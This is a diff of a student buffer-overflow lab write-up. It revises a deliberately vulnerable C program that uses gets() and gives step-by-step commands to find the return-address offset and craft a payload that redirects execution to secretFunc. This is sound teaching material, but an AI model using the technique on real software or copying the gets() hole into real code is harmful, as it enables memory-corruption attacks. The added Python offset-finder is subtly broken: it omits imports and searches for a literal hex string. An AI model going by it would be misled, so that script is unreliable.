@@ -2,7 +2,6 @@
 # Lab #1: Buffer Overflow
 # Task 1: Stack smashing by mermory overwritten
 
-
 ---
 
 ## 1.3. bof1.c
@@ -12,31 +11,53 @@
 ```c
 #include<stdio.h>
 #include<unistd.h>
+void secretFunc()
+{
+    printf("Congratulation!\n:");
+}
+int vuln(){
+    char array[200];
+    printf("Enter text:");
+    gets(array);
+    return 0;
+}
+int main(int argc, char*argv[]){
+    if (argv[1]==0){
+        prinf("Missing arguments\n");
+    }
+    vuln();
+    return 0;
+}
+```
+But the source should be like this, as typo in `printf` Function Call: we have `prinf` instead of `printf`.
+```
+#include <stdio.h>
+#include <unistd.h>
 
 void secretFunc()
 {
-    printf("Congratulation!\n");
+    printf("Congratulations!\n");
 }
 
 int vuln()
 {
     char array[200];
     printf("Enter text:");
-    gets(array);
+    gets(array); // Intentionally vulnerable function
     return 0;
 }
 
 int main(int argc, char *argv[])
 {
-    if (argv[1] == 0)
+    if (argc < 2)
     {
         printf("Missing arguments\n");
+        return 1;
     }
     vuln();
     return 0;
 }
 ```
-
 #### Key Points:
 1. The function `vuln` uses `gets`, which reads input without checking the buffer length, leading to buffer overflow.
 2. The target function `secretFunc` prints "Congratulation!\n".
@@ -48,32 +69,87 @@ int main(int argc, char *argv[])
 
 ### Detailed Steps
 
-#### Step 1: Determine the Offset
+#### Step 1: Create a Pattern
 
-1. **Create a pattern using `pattern_create`:**
+1. **Create a pattern using Python script:**
+   ```
+    import string
+    import itertools
+    
+    def generate_pattern(length):
+        charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
+        pattern = ''.join(''.join(x) for x in itertools.product(charset, repeat=3))
+        return pattern[:length]
+    
+    pattern_length = 300
+    pattern = generate_pattern(pattern_length)
+    print(pattern)
+
+   ```
+2. **Run the script to generate the pattern:**
    ```sh
-   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
+   python pattern_create.py > pattern.txt
+   ```
+    `AAAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA0AA1AA2AA3AA4AA5AA6AA7AA8AA9ABAABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABl`
+       
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/36c7a84d-8583-470d-a2cb-9407eb84728e)
+
+3. **Run the program with the pattern and a dummy argument:**
+   ```sh
+   cat pattern.txt | ./bof1.out dummy_arg
    ```
 
-2. **Run the program with the pattern:**
+*Now that it achieved a segmentation fault, we can proceed to determine the exact offset and craft the payload to exploit the vulnerability.*
+   ![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/e890441d-94d9-4c3c-a5b2-14589310916f)
+
+#### Step 2: Determine the Offset
+
+1. **Inspect the EIP value:**
    ```sh
-   ./bof1.out
-   Enter text:
-   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9
+   gdb ./bof1.out
+   (gdb) run dummy_arg < pattern.txt
+   (gdb) info registers
    ```
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/fa3b7cd3-a7b1-4309-9cc2-eea4a49410d1)
 
-3. **Find the offset using `pattern_offset`:**
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/c72c831a-9473-4b47-9474-5641797f39f2)
+
+
+2. **Find the offset using a Python script:**
+
+   ```python
+   import sys
+
+   def find_offset(pattern, value):
+       return pattern.find(value)
+
+   def generate_pattern(length):
+       charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
+       pattern = ''.join(''.join(x) for x in itertools.product(charset, repeat=3))
+       return pattern[:length]
+
+   pattern_length = 300
+   pattern = generate_pattern(pattern_length)
+
+   eip_value = "0x4a424149"  # Replace with your actual EIP value here
+   offset = find_offset(pattern, eip_value)
+   print(f'Offset: {offset}')
+   ```
+   
+   3. **Run the script with the EIP value:**
    ```sh
-   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>
+   python pattern_offset.py
    ```
+    ![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/ef5202bf-6ad9-4976-ab5b-ec1dd8d62731)
 
-#### Step 2: Craft the Payload
 
+#### Step 3: Craft the Payload
 1. **Find the address of `secretFunc`:**
    ```sh
+   gdb ./bof1.out
    (gdb) p secretFunc
-   $1 = {<text variable, no debug info>} 0x080484b6 <secretFunc>
    ```
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/e4951052-a87c-4540-a4eb-ecb5ec588796)
 
 2. **Create the payload:**
    ```sh
@@ -85,21 +161,19 @@ int main(int argc, char *argv[])
    xxd payload
    ```
 
-#### Step 3: Run the Program with the Payload
+#### Step 4: Run the Program with the Payload
 
-1. **Compile the program:**
+1. **Run the program with the payload and a dummy argument:**
    ```sh
-   gcc bof1.c -o bof1.out -fno-stack-protector -z execstack
-   ```
-
-2. **Run the program and provide the payload:**
-   ```sh
-   cat payload | ./bof1.out
+   cat payload | ./bof1.out dummy_arg
    ```
 
 ### Expected Output
 
-If the payload is correct, the program should call `secretFunc` and print "Congratulation!\n".
+If the payload is correct, the program should call `secretFunc` and print "Congratulations!\n".
+
+---
+
 
 ---
 
